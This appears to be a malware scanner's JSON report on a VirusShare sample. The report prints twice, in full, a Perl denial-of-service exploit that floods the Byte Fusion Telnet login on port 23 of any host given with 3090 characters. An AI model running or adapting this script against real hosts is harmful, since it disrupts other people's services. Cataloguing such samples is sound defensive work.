@@ -1,0 +1,66 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "open": "May open a file"
+        },
+        "macro": "#!/usr/bin/perl\n\n# Example for a possible DOS-attack against Byte Fusion Telnet.\n# There need to be 3090 characters to overflow Server.\n# Example : Trying example.com...\n# \t    Connected to example.com.\n# \t    Escape character is '^]'.\n#\t    Byte Fusion Telnet, Copyright 1999 Byte Fusion Corporation\n#           Unregistered Evaluation. See www.bytefusion.com/telnet.html\n#            (Machine name) Login: [more then 3090 characters]\n#\t    Overflow\n\nuse IO::Socket;\n\nprint \"Possible DOS-attack against Byte Fusion Telnet\\n\";\nprint \"++++++++++++++++++++++++++++++++++++++++++++++\\n\";\n\nif (not $ARGV[0]) {\n  print \"Usage: $0 [host]\\n\\n\";\n  exit(0);\n}\n\nsub connecthost {\n        $host = IO::Socket::INET->new ( Proto => \"tcp\",\n\t\t\t                PeerAddr => $ARGV[0],\n                \t\t\tPeerPort => \"23\",) or die \"Can't open connection to $ARGV[0] because $!\\n\";\n        $host->autoflush(1);\n} \n\n$bufferoverflow .= \"A\" x 3090;\n\nprint \"\\nOpen connection...\\n\";\n&connecthost; \nprint \"Sending characters...\\n\";\nprint $host \"$bufferoverflow\\n\";\nprint \"close connection...\\n\";\nclose $host;\n\nprint \"\\nTesting...\\n\";\n&connecthost(\"\\nThe host $ARGV[0] is vulnerable to this attack.\\n\");\nclose $host;\ndie \"The host $ARGV[0] is not vulnerable to this attack.\\n\";\n\n# by arbon(arbon@gmx.de)"
+    },
+    "filename": "VirusShare_21d37409fe976fa1ea003e14374411a5",
+    "filesize": 1277,
+    "filetype": "Perl script text executable",
+    "hashes": {
+        "md5": "21d37409fe976fa1ea003e14374411a5",
+        "sha1": "14d5d0a6ffaae46f239780eb145fc8c6cb0a8882",
+        "sha256": "9927cabb0b6f869b0a8bbd5ab5eec126d373f7ae015de109b4b078de2476e849"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "#!/usr/bin/perl",
+            "# Example for a possible DOS-attack against Byte Fusion Telnet.",
+            "# There need to be 3090 characters to overflow Server.",
+            "# Example : Trying example.com...",
+            "# \t    Connected to example.com.",
+            "# \t    Escape character is '^]'.",
+            "#\t    Byte Fusion Telnet, Copyright 1999 Byte Fusion Corporation",
+            "#           Unregistered Evaluation. See www.bytefusion.com/telnet.html",
+            "#            (Machine name) Login: [more then 3090 characters]",
+            "#\t    Overflow",
+            "use IO::Socket;",
+            "print \"Possible DOS-attack against Byte Fusion Telnet\\n\";",
+            "print \"++++++++++++++++++++++++++++++++++++++++++++++\\n\";",
+            "if (not $ARGV[0]) {",
+            "  print \"Usage: $0 [host]\\n\\n\";",
+            "  exit(0);",
+            "sub connecthost {",
+            "        $host = IO::Socket::INET->new ( Proto => \"tcp\",",
+            "\t\t\t                PeerAddr => $ARGV[0],",
+            "                \t\t\tPeerPort => \"23\",) or die \"Can't open connection to $ARGV[0] because $!\\n\";",
+            "        $host->autoflush(1);",
+            "$bufferoverflow .= \"A\" x 3090;",
+            "print \"\\nOpen connection...\\n\";",
+            "&connecthost; ",
+            "print \"Sending characters...\\n\";",
+            "print $host \"$bufferoverflow\\n\";",
+            "print \"close connection...\\n\";",
+            "close $host;",
+            "print \"\\nTesting...\\n\";",
+            "&connecthost(\"\\nThe host $ARGV[0] is vulnerable to this attack.\\n\");",
+            "close $host;",
+            "die \"The host $ARGV[0] is not vulnerable to this attack.\\n\";",
+            "# by arbon(arbon@gmx.de)"
+        ],
+        "file": {},
+        "fuzzing": {},
+        "ip": [],
+        "url": []
+    },
+    "time": "0:00:00.257895",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
